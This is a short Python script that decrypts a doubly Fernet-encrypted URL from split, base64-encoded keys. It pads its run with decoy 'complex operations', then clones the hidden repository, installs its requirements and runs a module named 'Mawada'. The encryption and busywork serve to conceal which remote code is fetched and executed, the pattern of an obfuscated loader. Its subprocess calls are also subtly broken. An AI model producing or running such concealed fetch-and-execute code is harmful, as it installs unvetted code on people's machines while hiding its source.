from cryptography.fernet import Fernet
import random
import string
import time
import base64

def get_key1():
    part1 = "rg8En8qSsLvFsMrD-"
    part2 = "aGer9yYB0h-M1tTdD"
    part3 = "Ng1fgVRaI="
    return base64.b64decode(part1 + part2 + part3)

def get_key2():
    part1 = "naEjkDI5e2u_bAxdkB"
    part2 = "61eqk0GJnTrOmCRe71"
    part3 = "dTYjj0w="
    return base64.b64decode(part1 + part2 + part3)

def get_encrypted_link():
    part1 = "gAAAAABmraSGmoEd99ja1tmTnEYKZMS4hpB3qZn0L3yRQK1uUyVY_ccLraWIlEK73vdkDoaLnxZBIytPr9Q6rPBYuFahmSyrP9jdujrk5d9kldkvdOsHlSvGsCMaoJtKpVudTBSdd5b_EToKgtLpc2XbfBeS5et0q8958QPqOQpT-uaddQFWpnElFUfviupcRQrtmjgTIycGCcS5aznyd3qrsTDSBGePAmawRn3sz9McUFQmcIsNsptgVIPnJhiJagqloD4QWi1s"
    return part1.encode()

def double_decrypt(encrypted_text, key1, key2):
    cipher_suite1 = Fernet(key1)
    cipher_suite2 = Fernet(key2)
    decrypted_once = cipher_suite2.decrypt(encrypted_text)
    decrypted_twice = cipher_suite1.decrypt(decrypted_once).decode()
    return decrypted_twice

def obscure_text(text):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=len(text)))

def perform_useless_operations(data):
    for _ in range(10000):
        data = ''.join(random.choices(string.ascii_letters + string.digits, k=len(data)))
    return data

def check_link_validity(link):
    assert link.startswith("https://")
    assert len(link) > 20

def execute_commands():
    print("Starting complex operations...")
    time.sleep(1)
    for _ in range(10):
        _ = ''.join(random.choices(string.ascii_letters + string.digits, k=100))
    print("Complex operations completed.")

def run_real_commands(link):
    import subprocess
    commands = [
        ["echo", "Cloning repository..."],
        ["git", "clone", link, "RSCALE"],
        ["echo", "Changing directory to RSCALE..."],
        ["bash", "-c", "cd RSCALE"],  # استخدام bash لتغيير الدليل
        ["echo", "Upgrading pip..."],
        ["pip3", "install", "--upgrade", "pip"],
        ["echo", "Installing requirements..."],
        ["pip3", "install", "-U", "-r", "requirements.txt"],
        ["echo", "Running Mawada module..."],
        ["python3", "-m", "Mawada"]
    ]
    for command in commands:
        print(f"Executing: {' '.join(command)}")
        subprocess.run(command, shell=True, check=True)
        time.sleep(1) 

def main():
    key1 = get_key1()
    key2 = get_key2()
    encrypted_link = get_encrypted_link()
    decrypted_link = double_decrypt(encrypted_link, key1, key2)

    obscure_link = obscure_text(decrypted_link)
    useless_result = perform_useless_operations(obscure_link)
    
    execute_commands()
    
    check_link_validity(decrypted_link)
    run_real_commands(decrypted_link)

if __name__ == "__main__":
    main()
